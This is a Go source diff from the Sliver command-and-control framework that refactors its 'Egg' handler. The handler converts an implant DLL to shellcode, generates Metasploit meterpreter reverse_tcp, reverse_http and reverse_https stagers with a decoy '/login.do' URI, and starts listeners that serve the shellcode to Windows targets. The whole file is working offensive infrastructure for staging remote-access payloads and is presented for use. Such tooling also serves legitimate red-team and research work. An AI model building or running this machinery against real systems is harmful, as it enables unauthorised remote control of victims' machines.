@@ -19,144 +19,92 @@ package rpc
 */
 
 import (
+	"context"
 	"fmt"
 	"sync"
-	"time"
 
 	consts "github.com/bishopfox/sliver/client/constants"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/server/c2"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/generate"
-	"github.com/bishopfox/sliver/server/msf"
-
-	"github.com/golang/protobuf/proto"
 )
 
-func rpcEgg(data []byte, timeout time.Duration, resp RPCResponse) {
-	var jobID int
-	eggReq := &clientpb.EggReq{}
-	err := proto.Unmarshal(data, eggReq)
-	if err != nil {
-		resp([]byte{}, err)
-		return
-	}
+// Egg - Generate a sliver "egg" i.e. staged payload
+func (rpc *Server) Egg(ctx context.Context, req *clientpb.EggReq) (*clientpb.Egg, error) {
+
 	// Create sRDI shellcode
-	config := generate.SliverConfigFromProtobuf(eggReq.Config)
-	config.Format = clientpb.SliverConfig_SHARED_LIB
+	config := generate.ImplantConfigFromProtobuf(req.Config)
+	config.Format = clientpb.ImplantConfig_SHARED_LIB
 	dllPath, err := generate.SliverSharedLibrary(config)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
 	sliverShellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver", "")
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
 	// Create stager shellcode
 	filename := fmt.Sprintf("%s_egg.bin", config.Name)
-	stage, err := generateMsfStage(eggReq.EConfig)
+	stage, err := rpc.MsfStage(req.EConfig)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
+
 	// Start c2 listener
-	switch eggReq.EConfig.Protocol {
+	var jobID int
+	switch req.EConfig.Protocol {
 	case clientpb.EggConfig_TCP:
-		jobID, err = jobStartEggTCPListener(eggReq.EConfig.Host, uint16(eggReq.EConfig.Port), sliverShellcode)
+		jobID, err = jobStartEggTCPListener(req.EConfig.Host, uint16(req.EConfig.Port), sliverShellcode)
 		if err != nil {
-			resp([]byte{}, err)
-			return
+			return nil, err
 		}
 	case clientpb.EggConfig_HTTP:
 		conf := &c2.HTTPServerConfig{
-			Addr:   fmt.Sprintf("%s:%d", eggReq.EConfig.Host, eggReq.EConfig.Port),
-			LPort:  uint16(eggReq.EConfig.Port),
-			Domain: eggReq.EConfig.Host,
+			Addr:   fmt.Sprintf("%s:%d", req.EConfig.Host, req.EConfig.Port),
+			LPort:  uint16(req.EConfig.Port),
+			Domain: req.EConfig.Host,
 			Secure: false,
 			ACME:   false,
 		}
-		job := jobStartEggHTTPListener(conf, sliverShellcode)
+		job, err := jobStartEggHTTPListener(conf, sliverShellcode)
+		if err != nil {
+			return nil, err
+		}
 		jobID = job.ID
 	case clientpb.EggConfig_HTTPS:
 		conf := &c2.HTTPServerConfig{
-			Addr:   fmt.Sprintf("%s:%d", eggReq.EConfig.Host, eggReq.EConfig.Port),
-			LPort:  uint16(eggReq.EConfig.Port),
-			Domain: eggReq.EConfig.Host,
+			Addr:   fmt.Sprintf("%s:%d", req.EConfig.Host, req.EConfig.Port),
+			LPort:  uint16(req.EConfig.Port),
+			Domain: req.EConfig.Host,
 			Secure: true,
 			ACME:   false,
 		}
-		job := jobStartEggHTTPListener(conf, sliverShellcode)
+		job, err := jobStartEggHTTPListener(conf, sliverShellcode)
+		if err != nil {
+			return nil, err
+		}
 		jobID = job.ID
 	default:
-		resp([]byte{}, fmt.Errorf("Not supported"))
-		return
+		return nil, fmt.Errorf("Protocol not supported")
 	}
-	// Send back response
-	data, err = proto.Marshal(&clientpb.Egg{
-		JobID:    int32(jobID),
+
+	return &clientpb.Egg{
+		JobID:    uint32(jobID),
 		Filename: filename,
 		Data:     stage,
-	})
-	resp(data, err)
+	}, nil
 }
 
-func generateMsfStage(config *clientpb.EggConfig) ([]byte, error) {
-	var (
-		stage   []byte
-		payload string
-		arch    string
-		uri     string
-	)
-
-	switch config.Arch {
-	case "amd64":
-		arch = "x64"
-	default:
-		arch = "x86"
-	}
-
-	// TODO: change the hardcoded URI to something dynamically generated
-	switch config.Protocol {
-	case clientpb.EggConfig_TCP:
-		payload = "meterpreter/reverse_tcp"
-	case clientpb.EggConfig_HTTP:
-		payload = "meterpreter/reverse_http"
-		uri = "/login.do"
-	case clientpb.EggConfig_HTTPS:
-		payload = "meterpreter/reverse_https"
-		uri = "/login.do"
-	default:
-		return stage, fmt.Errorf("Protocol not supported")
-	}
-
-	venomConfig := msf.VenomConfig{
-		Os:       "windows", // We only support windows at the moment
-		Payload:  payload,
-		LHost:    config.Host,
-		LPort:    uint16(config.Port),
-		Arch:     arch,
-		Format:   config.Format,
-		BadChars: []string{"\\x0a", "\\x00"}, // TODO: make this configurable
-		Luri:     uri,
-	}
-	stage, err := msf.VenomPayload(venomConfig)
-	if err != nil {
-		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
-		return stage, err
-	}
-	return stage, nil
-}
-
-func jobStartEggTCPListener(bindIface string, port uint16, shellcode []byte) (int, error) {
-	ln, err := c2.StartTCPListener(bindIface, port, shellcode)
+// StartEggTCPListener - Start a TCP egg (i.e. staged) payload listener
+func jobStartEggTCPListener(host string, port uint16, shellcode []byte) (int, error) {
+	ln, err := c2.StartTCPListener(host, port, shellcode)
 	if err != nil {
 		return -1, err // If we fail to bind don't setup the Job
 	}
 
 	job := &core.Job{
-		ID:          core.GetJobID(),
+		ID:          core.NextJobID(),
 		Name:        "TCP",
 		Description: "Raw TCP listener (egg only)",
 		Protocol:    "tcp",
@@ -169,7 +117,7 @@ func jobStartEggTCPListener(bindIface string, port uint16, shellcode []byte) (in
 		rpcLog.Infof("Stopping TCP listener (%d) ...", job.ID)
 		ln.Close() // Kills listener GoRoutines in startMutualTLSListener() but NOT connections
 
-		core.Jobs.RemoveJob(job)
+		core.Jobs.Remove(job)
 
 		core.EventBroker.Publish(core.Event{
 			Job:       job,
@@ -177,31 +125,35 @@ func jobStartEggTCPListener(bindIface string, port uint16, shellcode []byte) (in
 		})
 	}()
 
-	core.Jobs.AddJob(job)
+	core.Jobs.Add(job)
 
 	return job.ID, nil
 }
 
-func jobStartEggHTTPListener(conf *c2.HTTPServerConfig, data []byte) *core.Job {
-	server := c2.StartHTTPSListener(conf)
+// jobStartEggHTTPListener - Start an HTTP(S) egg (i.e. staged) payload listener
+func jobStartEggHTTPListener(conf *c2.HTTPServerConfig, data []byte) (*core.Job, error) {
+	server, err := c2.StartHTTPSListener(conf)
+	if err != nil {
+		return nil, err
+	}
 	name := "http"
 	if conf.Secure {
 		name = "https"
 	}
 	server.SliverShellcode = data
 	job := &core.Job{
-		ID:          core.GetJobID(),
+		ID:          core.NextJobID(),
 		Name:        name,
-		Description: fmt.Sprintf("%s for domain %s", name, conf.Domain),
+		Description: fmt.Sprintf("Egg handler %s for domain %s", name, conf.Domain),
 		Protocol:    "tcp",
 		Port:        uint16(conf.LPort),
 		JobCtrl:     make(chan bool),
 	}
-	core.Jobs.AddJob(job)
+	core.Jobs.Add(job)
 
 	cleanup := func(err error) {
 		server.Cleanup()
-		core.Jobs.RemoveJob(job)
+		core.Jobs.Remove(job)
 		core.EventBroker.Publish(core.Event{
 			Job:       job,
 			EventType: consts.StoppedEvent,
@@ -233,5 +185,5 @@ func jobStartEggHTTPListener(conf *c2.HTTPServerConfig, data []byte) *core.Job {
 		once.Do(func() { cleanup(nil) })
 	}()
 
-	return job
+	return job, nil
 }
